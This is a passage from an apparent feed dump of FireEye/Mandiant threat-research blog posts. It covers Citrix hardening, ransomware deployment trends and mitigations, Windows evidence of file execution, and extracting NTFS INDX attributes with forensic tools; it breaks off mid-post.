href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/red-team-operations.html\">Mandiant’s Red Team</a> and <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/incident-response.html\">Incident Response</a> engagements, we frequently identify a wide array of misconfigured technology solutions, including Citrix XenApp and XenDesktop.</p> \n<p>We often see attackers leveraging stolen credentials from third parties, accessing Citrix solutions, breaking out of published applications, accessing the underlying operating systems, and moving laterally to further compromise the environment. Our experience shows that attackers are increasingly using Citrix solutions to remotely access victim environments post-compromise, instead of using traditional backdoors, remote access tools, or other types of malware. Using a legitimate means of remote access enables attackers to blend in with other users and fly under the radar of security monitoring tools.</p> \n<p>Citrix provides extensive security hardening guidance and templates to their customers to mitigate the risk of these types of attacks. The guidance is contained in product-specific eDocs, Knowledge Base articles and detailed Common Criteria configurations. System administrators (a number of them wearing many hats and juggling multiple projects) may not have the time to review all of the hardening documentation available, so Mandiant and Citrix teamed up to provide guidance on the most significant risks posed to Citrix XenApp and XenDesktop implementations in a single white paper.</p> \n<p>This white paper covers risks and official Citrix hardening guidance for the following topics:</p> \n<ul> \n <li>Environment and Application Jailbreaking</li> \n <li>Network Boundary Jumping</li> \n <li>Authentication Weaknesses</li> \n <li>Authorization Weaknesses</li> \n <li>Inconsistent Defensive Measures</li> \n <li>Non-configured or Misconfigured Logging and Alerting</li> \n</ul> \n<p> <a href=\"https://www.citrix.com/content/dam/citrix/en_us/documents/products-solutions/system-hardening-for-xenapp-and-xendesktop.pdf\" target=\"_blank\">The white paper is available here.</a></p>","descriptionType":"html","publishedDate":"Tue, 15 Mar 2016 12:00:00 +0000","feedId":1226,"bgimg":"","linkMd5":"a2a6092ac8e8ede69574f13c0e481796","bgimgJsdelivr":"","metaImg":"","author":"Tony Lee","publishedOrCreatedDate":1598278264198},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"They Come in the Night: Ransomware Deployment Trends","link":"http://www.fireeye.com/blog/threat-research/2020/03/they-come-in-the-night-ransomware-deployment-trends.html","description":"<p>Ransomware is a remote, digital shakedown. It is disruptive and expensive, and it affects all kinds of organizations, from cutting edge <a href=\"https://news.sky.com/story/spacex-and-tesla-documents-leaked-online-by-hackers-11947792\">space technology</a> firms, to the <a href=\"https://www.itnews.com.au/news/australian-wool-sales-stopped-by-ransomware-attack-538657\">wool industry</a>, to <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2020/02/ransomware-against-machine-learning-to-disrupt-industrial-production.html\">industrial environments</a>. Infections have forced hospitals to <a href=\"https://arstechnica.com/information-technology/2019/10/hamstrung-by-ransomware-10-hospitals-are-turning-away-some-patients/\">turn away patients</a> and law enforcement to <a href=\"https://www.zdnet.com/article/six-suspected-drug-dealers-went-free-after-police-lost-evidence-in-ransomware-attack/\">drop cases</a> against drug dealers. Ransomware operators have recently begun combining encryption with the threat of <a href=\"https://www.bleepingcomputer.com/news/security/doppelpaymer-ransomware-launches-site-to-post-victims-data/\">data leak and exposure</a> in order to increase leverage against victims. There may be a silver lining, however; Mandiant Intelligence research suggests that focusing defensive efforts in key areas and acting quickly may allow organizations to stop ransomware before it is deployed.</p> \n<p>Mandiant Intelligence examined dozens of ransomware incident response investigations from 2017 to 2019. Through this research, we identified a number of common characteristics in initial intrusion vectors, dwell time, and time of day of ransomware deployment. We also noted threat actor innovations in tactics to maximize profits (Figure 1). Incidents affected organizations across North America, Europe, Asia Pacific, and the Middle East in nearly every sector category, including financial services, chemicals and materials, legal and professional services, local government, and healthcare. We observed intrusions attributed to financially motivated groups such as <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\">FIN6</a>, TEMP.MixMaster, and dozens of additional activity sets.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/ransomwaretrends/Picture1.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 1: Themes Observed in Ransomware Incidents</span></p> \n<p>These incidents provide us with enhanced insight into ransomware trends that can be useful for network defenders, but it is worth bearing in mind that this data represents only a sample of all activity. For example, Mandiant ransomware investigations increased 860% from 2017 to 2019. The majority of these incidents appeared to be post-compromise infections, and we believe that threat actors are accelerating use of tactics including post compromise deployment to increase the likelihood of ransom payment. We also observed incidents in which ransomware was executed immediately, for example GANDCRAB and GLOBEIMPOSTER incidents, but most of the intrusions examined were longer duration and more complex post-compromise deployments.</p> \n<h4>Common Initial Infection Vectors</h4> \n<p>We noted several initial infection vectors across multiple ransomware incidents, including RDP, phishing with a malicious link or attachment, and drive by download of malware facilitating follow-on activity. RDP was more frequently observed in 2017 and declined in 2018 and 2019. These vectors demonstrate that ransomware can enter victim environments by a variety of means, not all of which require user interaction.</p> \n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\"> \n <tbody> \n  <tr> \n   <td width=\"96\" valign=\"top\"><p> <b>RDP or other remote access</b></p> </td> \n   <td width=\"528\" valign=\"top\"><p>One of the most frequently observed vectors was an attacker logging on to a system in a victim environment via Remote Desktop Protocol (RDP). In some cases, the attacker brute forced the credentials (many failed authentication attempts followed by a successful one). In other cases, a successful RDP log on was the first evidence of malicious activity prior to a ransomware infection. It is possible that the targeted system used default or weak credentials, the attackers acquired valid credentials via other unobserved malicious activity, or the attackers purchased RDP access established by another threat actor. In <a href=\"https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\">April 2019</a>, we noted that FIN6 used stolen credentials and RDP to move laterally in cases resulting in ransomware deployment.</p> </td> \n  </tr> \n  <tr> \n   <td width=\"96\" valign=\"top\"><p> <b>Phishing with link or attachment</b></p> </td> \n   <td width=\"528\" valign=\"top\"><p>A significant number of ransomware cases were linked to phishing campaigns delivering some of the most prolific malware families in financially motivated operations: TRICKBOT, EMOTET, and FLAWEDAMMYY. In <a href=\"https://www.fireeye.com/blog/threat-research/2019/01/a-nasty-trick-from-credential-theft-malware-to-business-disruption.html\">January 2019</a>, we described TEMP.MixMaster TrickBot infections that resulted in interactive deployment of Ryuk.</p> </td> \n  </tr> \n  <tr> \n   <td width=\"96\" valign=\"top\"><p> <b>Drive-by-download</b></p> </td> \n   <td width=\"528\" valign=\"top\"><p>Several ransomware infections were traced back to a user in the victim environment navigating to a compromised website that resulted in a DRIDEX infection. In <a href=\"https://www.fireeye.com/blog/threat-research/2019/10/head-fake-tackling-disruptive-ransomware-attacks.html\">October 2019</a>, we documented compromised web infrastructure delivering FAKEUPDATES, then DRIDEX, and ultimately BITPAYMER or DOPPELPAYMER infections.</p> </td> \n  </tr>\n </tbody>\n</table> \n<h4>Most Ransomware Deployments Take Place Three or More Days After Initial Infection</h4> \n<p>The number of days elapsed between the first evidence of malicious activity and the deployment of ransomware ranged from zero to 299 days (Figure 2). That is, dwell times range quite widely, and in most cases, there was a time gap between first access and ransomware deployment. For 75 percent of incidents, at least three days passed between the first evidence of malicious activity and ransomware deployment.</p> \n<p>This pattern suggests that for many organizations, <b>if initial infections are detected, contained, and remediated quickly, the significant damage and cost associated with a ransomware infection could be avoided. </b>In fact, in a handful of cases, Mandiant incident responders and FireEye Managed Defense contained and remediated malicious activity, likely preventing ransomware deployment. Several investigations discovered evidence of ransomware installed into victim environments but not yet successfully executed.<b></b></p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/ransomwaretrends/Picture2.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 2: Days elapsed between initial access and ransomware deployment</span></p> \n<h4>Ransomware Deployed Most Often After Hours</h4> \n<p>In 76% of incidents we reviewed, ransomware was executed in victim environments after hours, that is, on a weekend or before 8:00 a.m. or after 6:00 p.m. on a weekday, using the time zone and customary work week of the victim organization (Figure 3 and Figure 4). This observation underscores that threat actors continue working even when most employees may not be.</p> \n<p>Some attackers possibly intentionally deploy ransomware after hours, on weekends, or during holidays, to maximize the potential effectiveness of the operation on the assumption that any remediation efforts will be implemented more slowly than they would be during normal work hours. In other cases, attackers linked ransomware deployment to user actions. For example, in 2019 incidents at retail and professional services firms, attackers created an Active Directory Group Policy Object to trigger ransomware execution based on user log on and log off.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/ransomwaretrends/Picture3.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 3: Ransomware execution frequently takes place after hours</span></p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/ransomwaretrends/Picture4.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 4: Ransomware execution by hour of the day</span></p> \n<h4>Mitigation Recommendations</h4> \n<p>Organizations seeking to prevent or mitigate the effects of ransomware infections could consider the following steps. For more comprehensive recommendations for addressing ransomware, please refer to our blog post: <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2019/09/ransomware-protection-and-containment-strategies.html\"><i>Ransomware Protection and Containment Strategies: Practical Guidance for Endpoint Protection, Hardening, and Containment</i></a> and the linked <a href=\"https://www.fireeye.com/content/dam/fireeye-www/current-threats/pdfs/wp-ransomware-protection-and-containment-strategies.pdf\">white paper</a>.</p> \n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\"> \n <tbody> \n  <tr> \n   <td width=\"96\" valign=\"top\"><p> <b>Address Infection Vectors</b></p> </td> \n   <td width=\"528\" valign=\"top\">\n    <ul> \n     <li>Use enterprise network, email, and host-based security products with up-to-date detections to prevent and detect many common malware strains such as TRICKBOT, DRIDEX, and EMOTET.</li> \n     <li>Contain and remediate infections quickly to prevent attackers from conducting follow-on activity or selling access to other threat actors for further exploitation.</li> \n     <li>Perform regular network perimeter and firewall rule audits to identify any systems that have inadvertently been left accessible to the internet. Disable RDP and other protocols to systems where this access is not expressly required. Enable multi-factor authentication where possible, particularly to internet-accessible connections, see pages 4-15 of the white paper for more details.</li> \n     <li>Enforce multi-factor authentication, that is, where enabled, do not allow single factor authentication for users who have not set up the multi-factor mechanism.</li> \n    </ul> </td> \n  </tr> \n  <tr> \n   <td width=\"96\" valign=\"top\"><p> <b>Implement Best Practices</b></p> </td> \n   <td width=\"528\" valign=\"top\">\n    <ul> \n     <li>For example, carry out regular anti-phishing training for all employees that operate a device on the company network. Ensure employees are aware of threat, their role in preventing it, and the potential cost of a successful infection.</li> \n     <li>Implement network segmentation when possible to prevent a potential infection from spreading.</li> \n     <li>Create regular backups of critical data necessary to ensure business continuity and, if possible, store them offsite, as attackers often target backups.</li> \n     <li>Restrict Local Administrator accounts from specific log on types, see page 18 of the white paper for more details.</li> \n     <li>Use a solution such as LAPS to generate a unique Local Administrator password for each system.</li> \n     <li>Disallow cleartext passwords to be stored in memory in order to prevent Mimikatz credential harvesting, see p. 20 of the white paper for more details.</li> \n     <li>Consider cyber insurance that covers ransomware infection.</li> \n    </ul> </td> \n  </tr> \n  <tr> \n   <td width=\"96\" valign=\"top\"><p> <b>Establish Emergency Plans</b></p> </td> \n   <td width=\"528\" valign=\"top\">\n    <ul> \n     <li>Ensure that after-hours coverage is available to respond within a set time period in the case of an emergency.</li> \n     <li>Institute after-hours emergency escalation plans that include redundant means to contact multiple stakeholders within the organization and 24-hour emergency contact information for any relevant third-party vendors.</li> \n    </ul> </td> \n  </tr>\n </tbody>\n</table> \n<h4>Outlook</h4> \n<p>Ransomware is disruptive and costly. Threat actor innovations have only increased the potential damage of ransomware infections in recent years, and this trend shows no sign of slowing down. We expect that financially motivated actors will continue to evolve their tactics to maximize profit generated from ransomware infections. We anticipate that post-compromise ransomware infections will continue to rise and that attackers will increasingly couple ransomware deployment with other tactics, such as data theft and extortion, increasing ransom demands, and targeting critical systems.</p> \n<p>The good news is that particularly with post-compromise infections, there is often a window of time between the first malicious action and ransomware deployment. If network defenders can detect and remediate the initial compromise quickly, it is possible to avoid the significant damage and cost of a ransomware infection.</p> \n<p>Register for our upcoming <a href=\"https://www.brighttalk.com/webcast/7451/389929\">ransomware webinar</a> to learn more.</p>","descriptionType":"html","publishedDate":"Mon, 16 Mar 2020 15:30:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/ransomwaretrends/Picture1.png","linkMd5":"1215ca3e5a7657a57e1b1e169abd3d23","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn9@2020_4/2020/08/24/14-11-05-755_5be20c90c14cc982.webp","destWidth":974,"destHeight":1137,"sourceBytes":468046,"destBytes":94698,"author":"Kelli Vanderlee","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/ransomwaretrends/Picture1.png":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn9@2020_4/2020/08/24/14-11-05-755_5be20c90c14cc982.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/ransomwaretrends/Picture2.png":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn4@2020_2/2020/08/24/14-11-11-874_109a96557427d192.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/ransomwaretrends/Picture3.png":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn67@2020_6/2020/08/24/14-11-12-845_aa7b2c4d69e9fa17.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/ransomwaretrends/Picture4.png":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn77@2020_5/2020/08/24/14-11-13-566_b481067541fc2c63.webp"},"publishedOrCreatedDate":1598278264188},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Did It Execute?","link":"http://www.fireeye.com/blog/threat-research/2013/08/execute.html","description":"<div class=\"c00 c00v1\"> \n <p>You found a malicious executable! Now you've got a crucial question to answer: did the file execute? We'll discuss a few sources of evidence you can use to answer this question. In this post, we will focus on static or \"dead drive\" forensics on Windows systems. We will cover four main sources of evidence: Windows Prefetch, Registry, Log Files, and File Information.</p> \n <p> <b>Prefetch</b></p> \n <p>Windows Prefetch is a good place to begin looking for evidence of file execution. Microsoft designed Windows Prefetch to allow commonly used programs to open faster. By default, it stores information for the last 128 executed files in prefetch files found in \"C:WindowsPrefetch\". A prefetch file is named as \"executable file name\" + <a target=\"_blank\" href=\"http://www.hexacorn.com/blog/2012/06/13/prefetch-hash-calculator-a-hash-lookup-table-xpvistaw7w2k3w2k8/\">hash</a> of file path + .pf. The prefetch file stores the first and last run dates, file path, number of times executed, and files loaded within the first ten seconds of process execution. So, if your malware filename / path hash shows up as a prefetch file named \"DABEARS.EXE-12F3B52A.pf\", then you know the file executed. Note: on Windows servers, Prefetch is disabled by default.</p> \n <p> <b>Registry</b></p> \n <p>As one would expect, the Windows Registry contains vast amounts of information on what goes on behind the scenes in Windows. Since the Registry is so large, the list below is not comprehensive, but it shows the main Registry keys we examine to determine file execution:</p> \n <p> <b>1. ShimCache</b></p> \n <p>Microsoft created the ShimCache, or \"AppCompatCache\" to identify application compatibility issues. The cache data tracks file path, size, last modified time, and last \"execution\" time (depending on OS). If a file is executed with Windows \"createprocess,\" it is logged in the ShimCache. While a file's presence in the ShimCache does not 100% prove file execution, it does show Windows interacted with the file. The following keys contain ShimCache data: \"HKLMSYSTEMCurrentControlSetControlSession ManagerAppCompatibilityAppCompatCache (XP) and \"HKLMSYSTEMCurrentControlSetControlSession ManagerAppCompatCacheAppCompatCache\" (Non-XP). For more information on the ShimCache, see Andrew Davis' blog entry <a target=\"_blank\" href=\"https://www.mandiant.com/blog/leveraging-application-compatibility-cache-forensic-investigations/\">here</a> - or Mandiant's SANS DFIR conference presentation <a target=\"_blank\" href=\"https://www.dropbox.com/s/7aulgcm84vnsaeg/Johnny%20AppCompatCache.pdf\">here</a>.</p> \n <p> <b>2. MUICache</b></p> \n <p>When a file is executed via Windows Explorer, the program shell creates an entry in the MUICache. There's a good write up of the process on the <a target=\"_blank\" href=\"http://windowsir.blogspot.com/2005/12/mystery-of-muicachesolved.html\">Windows Incident Response blog</a>. Windows uses the MUICache to store application names as retrieved from the PE Version Information in its Resource Section. The information is stored in the following keys:</p> \n <ul> \n  <li>\"HKCUSoftwareMicrosoftWindowsShellNoRoamMUICache\" (XP, 2000, 2003) and</li> \n  <li>\"HKCUSoftwareClassesLocal SettingsSoftwareMicrosoftWindowsShellMuiCache\" (Vista, 7, 2008).</li> \n </ul> \n <p> <b>3. UserAssist</b></p> \n <p>The UserAssist tracks executables and links opened in Explorer. The UserAssist key tracks last execution time and number of times a file was run in the registry key: \"HKCUSoftwareMicrosoftWindowsCurrentVersionExplorerUserAssist\". Values under the UserAssist key, corresponding to the executable names and file paths, are encrypted with ROT13; as a result, you may miss evidence within this key if you conduct keyword searches prior to decoding. There are a number of tools to decrypt the key, including the RegRipper userassist.pl plugin, found <a target=\"_blank\" href=\"https://code.google.com/p/regripper/downloads/list\">here</a>.</p> \n <p> <b>Log Files</b></p> \n <p>There are a few logs you can analyze to determine file execution. Start with the Windows System Event Log, since this log records service starts. The event in Figure 1 shows an Administrator (SID=\"-500\") executed the PSEXECSVC remote execution service:</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-Event-ID-7035-Service-start.png\"><img width=\"508\" height=\"141\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-Event-ID-7035-Service-start.png\" class=\"size-full wp-image-5063\" /></a>Figure 1: Event ID 7035 - Service start\n <p>When a service starts, it usually executes the file specified in the ImagePath or a loaded service DLL. For example, the \"Netman\" service uses the legitimate file \"netman.dll\" when it executes. However, if the ServiceDll in the registry contains a path to a backdoor named \"tabcteng.dll\", the \"Netman\" service would execute \"tabcteng.dll\" instead. Be sure to validate the files in the ImagePath and ServiceDlls for any suspicious service starts.</p> \n <p>If Audit Process Tracking is enabled in the Windows Event Log audit settings, the Windows Security Event Log is a wealth of information about processes and can definitively prove file execution. Figure 2 and Figure 3 show the malicious file and associated process ID, as well as the parent process ID and username to aid in further investigation.</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-2-XP-EventID-592-Process-creation.png\"><img width=\"504\" height=\"81\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-2-XP-EventID-592-Process-creation.png\" class=\"size-full wp-image-5064\" /></a>Figure 2: XP EventID 592 - Process creation\n <p>Windows Vista+ records a similar process creation event, but the EventID is 4688.</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-3-Vista+-EventID-4688-Process-creation.png\"><img width=\"503\" height=\"219\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-3-Vista+-EventID-4688-Process-creation.png\" class=\"size-full wp-image-5065\" /></a>Figure 3: Vista+ EventID 4688 - Process creation\n <p>Auditing capabilities are more granular with newer versions of Windows and are integrated with Group Policy starting in Windows Server 2008 R2 and Windows 7. Advanced audit policy settings can be found <a target=\"_blank\">here</a>.</p> \n <p>There are too many vendors to cover in this post, but host-based IPS or AV product logs may show when a file is running and/or attempting an action on another file. Figure 4 contains an example event from a McAfee Access Protection log.</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-4-McAfee-Access-Protection-log-event.png\"><img width=\"508\" height=\"96\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-4-McAfee-Access-Protection-log-event.png\" class=\"size-full wp-image-5066\" /></a>Figure 4: McAfee Access Protection log event\n <p>The Windows Scheduled Task Log may confirm if the attacker used a scheduled task to execute malware. Scheduled Tasks are recorded in a log file named \"SchedLgU.txt\" as follows:</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-5-Event-in-Scheduled-Task-log.png\"><img width=\"503\" height=\"79\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-5-Event-in-Scheduled-Task-log.png\" class=\"size-full wp-image-5067\" /></a>Figure 5: Event in Scheduled Task log\n <p>In Windows Vista+, the scheduled task executions are also recorded in the log \"Microsoft-Windows-TaskScheduler/Operational\" event log under Event ID 200 and 201.</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-6-Event-ID-200-201-Scheduled-Task-execution.png\"><img width=\"508\" height=\"86\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-6-Event-ID-200-201-Scheduled-Task-execution.png\" class=\"size-full wp-image-5068\" /></a>Figure 6: Event ID 200 &amp; 201 - Scheduled Task execution\n <p>Finally, if an application <a target=\"_blank\" href=\"http://xkcd.com/376/\">crashes</a>, the Dr. Watson log may record a malicious task running.</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-7-Running-tasks-captured-in-Dr.-Watson-Log.png\"><img width=\"503\" height=\"108\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-7-Running-tasks-captured-in-Dr.-Watson-Log.png\" class=\"size-full wp-image-5069\" /></a>Figure 7: Running tasks captured in Dr. Watson Log\n <p> <b>File Functionality</b></p> \n <p>Another way to determine if a file was executed is to look for any output files. When you analyzed the malicious file, was it configured to create data? For example, if the malicious file you found is a keylogger and an associated keylog file is present on the system, the attacker likely executed the file. If the malware was configured to connect to a particular domain name, the browser history may have recorded the associated domain. Table 1 contains an example of two communication mechanisms captured in browser history from the same backdoor.</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Table-1-Malicious-communication-in-browser-history.png\"><img width=\"648\" height=\"109\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Table-1-Malicious-communication-in-browser-history.png\" class=\"size-full wp-image-5070\" /></a>Table 1: Malicious communication in browser history\n <p>To determine if a malicious file executed, analyze the file's functionality, and look for evidence of the resulting activity on disk. Malware functionality can also help you assess an attacker's <a target=\"_blank\" href=\"https://www.mandiant.com/blog/chinese-motivations-corporate-espionage-historical-perspective/\">motivation</a>, end goals, and perhaps reveal additional malicious files.</p> \n <p>While this post covered the primary sources of evidence we use to detect file execution, there are many more Registry keys and other Windows files which provide evidence of malware execution, especially in Windows Vista and above. Similarly, information found in system memory can be even more valuable for proving file execution and may provide specific attacker commands and accessed resources. So please, if you find a malicious executable on a running system, <b> <i>be sure to capture the memory</i></b> before doing anything else. You can capture and analyze memory with <a target=\"_blank\" href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/redline.html\">Mandiant Redline™</a>.</p> \n <p>We will discuss more forensic artifacts in future posts, but feel free to direct message me on Twitter <a target=\"_blank\" href=\"https://twitter.com/marycheese\">@marycheese</a>.</p> \n</div>","descriptionType":"html","publishedDate":"Tue, 27 Aug 2013 22:26:05 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-Event-ID-7035-Service-start.png","linkMd5":"17366ee2647d10e3df3ad24134af351c","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn39@2020_5/2020/08/24/14-11-06-782_db628174110f0125.webp","destWidth":508,"destHeight":141,"sourceBytes":3801,"destBytes":12108,"author":"Mary Singh","articleImgCdnMap":{"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-Event-ID-7035-Service-start.png":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn39@2020_5/2020/08/24/14-11-06-782_db628174110f0125.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-2-XP-EventID-592-Process-creation.png":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn33@2020_2/2020/08/24/14-11-08-781_f9b29468c06d3800.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-3-Vista+-EventID-4688-Process-creation.png":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn19@2020_3/2020/08/24/14-11-10-484_fd6ad7290350b715.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-4-McAfee-Access-Protection-log-event.png":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn41@2020_3/2020/08/24/14-11-16-339_b53fb724a4662a17.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-5-Event-in-Scheduled-Task-log.png":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn76@2020_4/2020/08/24/14-11-09-096_6cbec46a612957fc.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-6-Event-ID-200-201-Scheduled-Task-execution.png":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn1@2020_4/2020/08/24/14-11-13-874_6fae370555093f4b.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-7-Running-tasks-captured-in-Dr.-Watson-Log.png":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn75@2020_3/2020/08/24/14-11-17-552_b13e97df9113f114.webp","https://www.fireeye.com/content/dam/legacy/ammo/Table-1-Malicious-communication-in-browser-history.png":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn69@2020_2/2020/08/24/14-11-15-591_e89db1806ac0f694.webp"},"publishedOrCreatedDate":1598278264208},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Incident Response with NTFS INDX Buffers – Part 1: Extracting an INDX Attribute","link":"http://www.fireeye.com/blog/threat-research/2012/09/striking-gold-incident-response-ntfs-indx-buffers-part-1.html","description":"<div class=\"c00 c00v1\"> \n <p>By William Ballenthin &amp; Jeff Hamm</p> \n <p>On August 30, 2012, we presented a <a href=\"http://www.mandiant.com/events/webinar/fresh-prints-of-mal-ware-striking-gold-in-incident-response-with-ntfs-indx-\">webinar</a> on how to use INDX buffers to assist in an<a href=\"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/incident-response.html\"> incident response</a> investigation. During the Q&amp;A portion of the webinar we received many questions; however, we were not able to answer all of them. We're going to attempt to answer the remaining questions by posting a four part series on this blog. This series will address:</p> \n <ul> \n  <li> <strong>Part 1: Extracting an INDX Attribute</strong></li> \n  <li> <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2012/09/incident-response-ntfs-indx-buffers-part-2-internal.html\">Part 2: The Internal Structures of a File Name Attribute</a></li> \n  <li> <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2012/10/incident-response-ntfs-indx-buffers-part-3-step-step-guide.html\">Part 3: A Step by Step Guide to Parse INDX</a></li> \n  <li> <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2012/10/incident-response-ntfs-indx-buffers-part-4-br-internal.html\">Part 4: The Internal Structures of an INDX Structure</a></li> \n </ul> \n <h4>Part 1: Extracting an INDX Record</h4> \n <p>An INDX buffer in the NTFS file system tracks the contents of a folder. INDX buffers can be resident in the $MFT (Master File Table) as an index root attribute (attribute type 0x90) or non-resident as an index allocation attribute (attribute 0xA0) (non-resident meaning that the content of the attribute is in the data area on the volume.)</p> \n <p>INDX root attributes have a dynamic size in the MFT, so as the contents change, the size of the attributes change. When an INDX root attribute shrinks, the surrounding attributes shift and overwrite any old data. Therefore, it is not possible to recover slack entries from INDX root attributes. On the other hand, the file system driver allocates INDX allocation attributes in multiples of 4096, even though the records may only be 40 bytes. As file system activity adds and removes INDX records from an allocation attribute, old records may still be recoverable in the slack space found between the last valid entry and the end of the 4096 chunk. This is very interesting to a forensic investigator. Fortunately, many forensic tools support extracting the INDX allocation attributes from images of an NTFS file system.</p> \n <h4>Scenario</h4> \n <p>Let's say that during your investigation you identified a directory of interest that you want to examine further. In the scenario we used during the webinar, we identified a directory as being of interest because we did a keyword search for \"1.rar\". The results of the search indicated that the slack space of an INDX attribute contained the suspicious filename \"1.rar\". The INDX attribute had the $MFT record number 49.</p> \n <p>Before we can parse the data, we need to extract the valid index attribute's content. Using various forensic tools, we are capable of this as demonstrated below.</p> \n <h4>The SleuthKit</h4> \n <p>We can use the SleuthKit tools to extract both the INDX root and allocation data. To extract the INDX attribute using the SleuthKit, the first step is to identify the $MFT record IDs for the attributes of the inode. We want the content of the index root attribute (attribute type 0x90 or 144d) and the index allocation attribute (attribute type 0xA0 or 160d).</p> \n <p>To identify the attribute IDs, run the command:</p> \n <p> <code>istat -f ntfs ntfs.dd 49</code></p> \n <p>The istat command returns inode information from the $MFT. In the command we are specifying the NTFS file system with the \"-f\" switch. The tool reads a raw image named \"ntfs.dd\" and locates record number 49. The result of our output (truncated) was as follows:</p> \n <p> <code>....<br /> Attributes:<br /> Type: $STANDARD_INFORMATION (16-0) Name: Resident size: 72</code></p> \n <p>...</p> \n <p>Type: $I30 (144-6) Name: $I30 Resident size: 26</p> \n <p>Type: $I30 (160-7) Name: $I30 Non-Resident size: 4096</p> \n <p>The information returned for the attribute list includes the index root - $I30 (144-6) - and an index allocation - $I30 (160-7). The attribute identifier is the integer listed after the dash. Therefore, the index root attribute 144 has an identifier of 6, and the index allocation attribute 160 has an identifier of 7.</p> \n <p>With this information, we can gather the content of the attributes with the SleuthKit commands:</p> \n <p> <code>icat -f ntfs ntfs.dd 49-144-6 &gt; INDX_ROOT.bin</code></p> \n <p> <code>icat -f ntfs ntfs.dd 49-160-7 &gt; INDX_ALLOCATION.bin</code></p> \n <p>The icat command uses the NTFS module to identify the record (49) attribute (144-6 and 144-7), and outputs the attribute data into the respective files INDX_ROOT.bin and INDX_ALLOCATION.bin.</p> \n <h4>EnCase</h4> \n <p>We can use EnCase to extract the INDX allocation data. To use EnCase version 6.x to gather the content of the INDX buffers, in the explorer tree, right click the folder icon. The \"Copy/UnErase...\" option applied to a directory will copy the content of the INDX buffer as a binary file. Specify a location to save the file. Note that the \"Copy Folders...\" option will copy the directory and its contents and will NOT extract the INDX structure.</p> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Copy_UnErase_Pic-1.png\"><img class=\"alignnone size-full wp-image-3267\" title=\"Copy/UnErase\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Copy_UnErase_Pic-1.png\" width=\"379\" height=\"88\" /></a></p> \n <h4>FTK</h4> \n <p>We can use the Forensic Toolkit (FTK) to extract the INDX allocation data. Using FTK or FTK Imager, the INDX allocation attributes appear in the file list pane. These have the name \"$I30\" because the stream name is identified as 